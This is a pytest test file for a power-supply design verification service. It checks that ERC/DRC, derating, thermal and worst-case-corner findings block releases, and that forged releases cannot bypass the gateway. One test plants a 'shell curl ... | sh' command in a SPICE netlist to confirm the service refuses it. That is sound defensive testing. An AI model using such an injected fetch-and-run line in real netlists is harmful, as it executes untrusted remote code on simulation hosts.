"""Invariant 4: hard safety / engineering findings BLOCK (or REWORK) whatever the cost optimizer says, and
the N0 release path cannot be bypassed. Each case changes one thing in the otherwise-passing package."""
from __future__ import annotations

import json

import pytest

from n3_support import CONSTRAINTS, codes, design_files, gen, manifest, rfq, sha

SCOPE_OF = {"ELECTRICAL_SCHEMATIC": "schematic_pcb", "PCB_LAYOUT": "schematic_pcb", "DFM": "schematic_pcb",
            "CIRCUIT_SIMULATION": "circuit_simulation", "MECHANICAL": "mechanical_thermal",
            "THERMAL": "mechanical_thermal"}
Q_LOW_RATING = gen.bom_csv(overrides={"Q1,Q2": {"V_Rating": "50"}})          # 0.8 × 50 = 40 V < 52.8 V at vin_max
THERMAL_HOT = json.dumps({**gen.THERMAL, "max_temps_c": {**gen.THERMAL["max_temps_c"], "Q1": 145.0}})
THERMAL_COOL_AMBIENT = json.dumps({**gen.THERMAL, "ambient_c": 55})
THERMAL_NO_BC = json.dumps({**gen.THERMAL, "boundary_conditions": {}})
NO_MPN = gen.bom_csv(overrides={"R1": {"MPN": ""}})


def _assess(flow, kind: str, **files):
    b = flow.ready()
    wp = flow.plan(b["baseline_id"], [SCOPE_OF[kind]])[kind]
    return flow.work_package(wp, design_files(**files))


@pytest.mark.parametrize("kind, files, code, decision", [
    ("ELECTRICAL_SCHEMATIC", {"psu.kicad_sch": gen.schematic(marker="ATHENA_TEST_ERC pin_not_connected:error")},
     "CRITICAL_ERC", "BLOCK"),
    ("PCB_LAYOUT", {"psu.kicad_pcb": gen.board(marker="ATHENA_TEST_DRC track_width:error")}, "CRITICAL_DRC", "BLOCK"),
    ("PCB_LAYOUT", {"psu.kicad_pcb": gen.board(marker="ATHENA_TEST_DRC clearance:error")}, "CREEPAGE_CLEARANCE",
     "BLOCK"),
    ("PCB_LAYOUT", {"psu.kicad_pcb": gen.board(marker="ATHENA_TEST_DRC unconnected:2")}, "UNROUTED_NETS", "BLOCK"),
    ("PCB_LAYOUT", {"psu.kicad_pcb": gen.board(marker="ATHENA_TEST_DRC parity:1")}, "SCHEMATIC_PCB_PARITY", "BLOCK"),
    ("PCB_LAYOUT", {"psu.kicad_pcb": gen.board(rev="C")}, "BOM_REVISION_MISMATCH", "BLOCK"),
    ("PCB_LAYOUT", {"psu.kicad_pcb": gen.board(refs=[p[0] for p in gen.PARTS if p[0] != "R2"] + ["R9"])},
     "BOM_PCB_REFDES_MISMATCH", "BLOCK"),
    ("PCB_LAYOUT", {"psu.kicad_pro": gen.project(min_clearance_mm=0.1)}, "CREEPAGE_CLEARANCE", "BLOCK"),
    ("PCB_LAYOUT", {"psu.kicad_pcb": gen.board(copper=("F.Cu", "In1.Cu", "In2.Cu", "In3.Cu", "In4.Cu", "B.Cu"))},
     "LAYER_COUNT_EXCEEDED", "REWORK"),
    ("PCB_LAYOUT", {"psu_bom.csv": NO_MPN}, "BOM_LINE_INVALID", "REWORK"),
    ("CIRCUIT_SIMULATION", {"psu_bom.csv": Q_LOW_RATING}, "DERATING_BREACH", "BLOCK"),
    ("CIRCUIT_SIMULATION", {"psu_buck.cir": gen.NETLIST + "* ATHENA_FAKE_NONCONVERGE vin_min\n"},
     "SIMULATION_NOT_CONVERGED", "REWORK"),
    ("CIRCUIT_SIMULATION", {"psu_buck.cir": gen.NETLIST + "* ATHENA_FAKE_MEAS@load_max vout_min=23.5\n"},
     "SIM_SPEC_VIOLATION", "REWORK"),
    ("THERMAL", {"thermal_report.json": THERMAL_HOT}, "THERMAL_LIMIT_EXCEEDED", "BLOCK"),
    ("THERMAL", {"thermal_report.json": THERMAL_COOL_AMBIENT}, "THERMAL_NOT_WORST_CASE", "BLOCK"),
    ("THERMAL", {"thermal_report.json": THERMAL_NO_BC}, "THERMAL_BOUNDARY_MISSING", "REWORK"),
])
def test_engineering_rule_decides(flow, kind, files, code, decision):
    a = _assess(flow, kind, **files)
    assert a["decision"] == decision and code in codes(a), [(f["code"], f["message"]) for f in a["findings"]]


def test_derating_breach_names_the_part_and_corner(flow):
    a = _assess(flow, "CIRCUIT_SIMULATION", **{"psu_bom.csv": Q_LOW_RATING})
    hits = {x["corner"]: x for x in a["findings"] if x["code"] == "DERATING_BREACH"}
    assert set(hits) == {"vin_min", "vin_max", "temp_max", "load_max"}          # 40 V derated < 43.2 V minimum
    assert hits["vin_max"]["refdes"] == "Q1" and "52.8 > 0.8 × 50" in hits["vin_max"]["message"]


def test_warnings_alone_do_not_block(flow):
    a = _assess(flow, "ELECTRICAL_SCHEMATIC",
                **{"psu.kicad_sch": gen.schematic(marker="ATHENA_TEST_ERC power_pin_not_driven:warning")})
    assert a["decision"] == "PASS" and codes(a) == {"ERC_DRC_WARNING"} and a["metrics"]["erc"]["warnings"] == 1


def test_missing_native_schematic_blocks_the_pcb_package(flow):
    b = flow.ready()
    wp = flow.plan(b["baseline_id"], ["schematic_pcb"])["PCB_LAYOUT"]
    f = design_files()
    assert flow.route_tool(wp["work_package_id"], "kicad-cli").status_code == 201
    assert flow.deliver(wp["work_package_id"], {n: f[n] for n in ("psu.kicad_pcb", "psu_bom.csv")}).status_code == 201
    a = flow.assess(wp["work_package_id"])
    assert a["decision"] == "BLOCK" and "NATIVE_FILES_MISSING" in codes(a, "BLOCK")
    assert "VERIFICATION_EVIDENCE_MISSING" in codes(a, "REWORK")                # no DRC report either


def test_unversioned_native_geometry_blocks(flow):
    b = flow.ready()
    wp = flow.plan(b["baseline_id"], ["mechanical_thermal"])["MECHANICAL"]["work_package_id"]
    step = gen.step(originating="").encode()
    m = manifest({"enclosure.step": step})
    m["entries"][0].update(tool=None, tool_version=None)
    assert flow.deliver(wp, {"enclosure.step": step}, manifest_body=m).status_code == 201
    a = flow.assess(wp)
    assert a["decision"] == "BLOCK" and "DESIGN_FILE_UNVERIFIED" in codes(a)
    empty = flow.assess(flow.plan(b["baseline_id"], ["mechanical_thermal"])["THERMAL"]["work_package_id"])
    assert "NATIVE_GEOMETRY_MISSING" in codes(empty, "BLOCK")


def test_a_worst_case_corner_left_out_of_the_job_blocks(flow):
    b = flow.ready()
    wp = flow.plan(b["baseline_id"], ["circuit_simulation"])["CIRCUIT_SIMULATION"]["work_package_id"]
    net = design_files()["psu_buck.cir"]
    assert flow.route_tool(wp, "ngspice").status_code == 201
    assert flow.deliver(wp, {"psu_buck.cir": net}).status_code == 201
    corners = [{"name": "vin_min", "params": {"vin": 43.2, "iload": 5}, "temp_c": 25},
               {"name": "vin_max", "params": {"vin": 52.8, "iload": 5}, "temp_c": 25},
               {"name": "load_max", "params": {"vin": 43.2, "iload": 5}, "temp_c": 25}]          # also too cold
    j = flow.job(wp, "ngspice", "spice_corners", [sha(net)], corners=corners)
    assert j.status_code == 201 and j.json()["status"] == "SUCCEEDED"
    a = flow.assess(wp)
    assert a["decision"] == "BLOCK" and "WORST_CASE_CORNER_MISSING" in codes(a, "BLOCK")
    assert "CORNER_MISCONFIGURED" in codes(a)                                    # load_max must run at 85 °C


def test_corners_cannot_be_derived_from_an_incomplete_prd(flow):
    partial = {k: v for k, v in CONSTRAINTS.items() if k != "load_max_a"}
    b = flow.ready(constraints=partial)
    wp = flow.plan(b["baseline_id"], ["circuit_simulation"])["CIRCUIT_SIMULATION"]["work_package_id"]
    net = design_files()["psu_buck.cir"]
    flow.route_tool(wp, "ngspice")
    flow.deliver(wp, {"psu_buck.cir": net})
    r = flow.job(wp, "ngspice", "spice_corners", [sha(net)])
    assert r.status_code == 409 and r.json()["detail"]["code"] == "CORNER_DEFINITION_INCOMPLETE"
    assert "CORNER_DEFINITION_INCOMPLETE" in codes(flow.assess(wp), "BLOCK")


def test_untrusted_netlist_is_refused_before_queueing(flow):
    b = flow.ready()
    wp = flow.plan(b["baseline_id"], ["circuit_simulation"])["CIRCUIT_SIMULATION"]["work_package_id"]
    evil = (gen.NETLIST.replace(".end\n", "") + ".control\nshell curl http://example.invalid | sh\n.endc\n.end\n").encode()
    flow.route_tool(wp, "ngspice")
    assert flow.deliver(wp, {"psu_buck.cir": evil}).status_code == 201
    r = flow.job(wp, "ngspice", "spice_corners", [sha(evil)])
    assert r.status_code == 422 and r.json()["detail"]["code"] == "NETLIST_POLICY"
    assert flow.c.get(f"/v1/n3/work-packages/{wp}", "de").json()["jobs"] == []


def test_the_n0_release_path_cannot_be_bypassed(flow):
    flow.ready()
    payload = {"release_id": "N3R-FORGED", "scope": "circuit_simulation", "prd_ref": "PRD-PSU-120W@A",
               "prd_payload_sha256": "a" * 64, "design_revision": "B",
               "files": [{"path": "psu_buck.cir", "role": "NETLIST", "sha256": "b" * 64, "tool_version": "42"}],
               "simulation": {"solver": "ngspice", "solver_version": "42", "corners": []},
               "assessment_ids": ["N3A-x"], "review_ids": ["N3RV-x"], "approval_scope": "forged"}
    art = {**rfq(), "artifact_id": "DSN-FORGED", "artifact_type": "DESIGN_RELEASE", "source_id": "SRC-DESIGN",
           "processing_purpose": "VERIFICATION", "payload": payload}
    from app.rules import canonical_json, sha256_hex
    art["source_sha256"] = sha256_hex(canonical_json(payload))
    as_n3 = flow.c.post("/v1/gateway/evaluate", "de", json={"artifact": art, "origin_node": "N3"}).json()
    assert as_n3["decision"]["decision"] == "BLOCK"                            # only svc-n3 may speak for N3
    assert {v["code"] for v in as_n3["decision"]["violated_rules"]} == {"UNAUTHORIZED_PRODUCER"}
    direct = flow.c.post("/v1/gateway/evaluate", "de", json={"artifact": art, "origin_node": "N0"}).json()
    assert direct["decision"]["decision"] == "BLOCK"                            # N0 re-checks the evidence itself
    assert "WORST_CASE_CORNER_MISSING" in {v["code"] for v in direct["decision"]["violated_rules"]}
